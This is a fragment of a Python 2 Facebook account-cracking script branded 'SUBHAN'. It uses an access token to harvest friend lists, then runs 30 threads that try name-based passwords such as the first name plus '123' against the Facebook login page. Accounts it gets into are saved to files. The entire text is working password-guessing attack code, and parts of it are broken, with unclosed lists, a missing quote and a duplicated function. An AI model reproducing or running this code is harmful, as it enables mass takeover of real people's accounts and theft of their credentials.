    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print logo
    print ""
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print     cracking start please wait ..   "
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(["'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('rsa-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('subhan-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('rsa-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                            cp=open('rsa-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"1234"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('rsa-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass3
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('rsa-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+"123"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('rsa-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] total ok ids : '+str(len(oks))
    print '[!] total cp ids : '+str(len(cps))
    print "\033[1;93m NAAM TO SONA HOGAA [SUBHAN])"
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
    
def xokp():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[1] Enter ID : ")
    print ""
    ps1=raw_input('[1] Password : ')
    ps2=raw_input('[2] Password : ')
    ps3=raw_input('[3] Password : ')
    ps4=raw_input('[4] Password : ')
    print ""
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print g+"[=] Transfer Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print logo
    print ""
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print "[!] Total Ids: "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m Cracking Start Please Wait ..   "
    print "\033[1;91m Use Airplane Mod For Up Speed "
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('IMTIAZ-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-OK.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                            cp=open('SUBHAN-OK.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"1234"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                    cp=open('SUBHAN-OK.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                            cp=open('SUBHAN-ok.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+"123"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('SUBHAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] Cloning Complete Result ........"
    
    print 39*'-'
    print '[!] Total Ok Ids : '+str(len(oks))
    print '[!] Total Cp Ids :'+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press Enter To Back ')
    fb_menu()








def xokp():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[=] Enter ID : ")
    print ""
    ps1=raw_input('[1] Password : ')
    ps2=raw_input('[2] Password : ')
    ps3=raw_input('[3] Password : ')
    ps4=raw_input('[4] Password : ')
    print ""
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print g+"[=] Transfer Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
